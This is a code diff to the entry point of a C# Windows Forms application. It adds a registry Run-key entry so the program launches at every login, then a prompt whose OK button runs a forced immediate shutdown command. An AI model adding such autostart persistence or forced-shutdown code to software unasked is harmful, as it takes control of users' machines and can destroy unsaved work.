@@ -14,7 +14,27 @@ namespace WindowsFormsApplication1
         [STAThread]
         static void Main()
         {
-            Application.EnableVisualStyles();
+            Microsoft.Win32.RegistryKey reg;
+            reg =
+                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+            try
+            {
+
+                reg.SetValue("MyProgram", Application.ExecutablePath);
+
+                reg.Close();
+
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+             if (MessageBox.Show("Off", "off", MessageBoxButtons.OKCancel) == DialogResult.OK)
+             {
+            System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");
+        }
+
+        Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new Form1());
         }
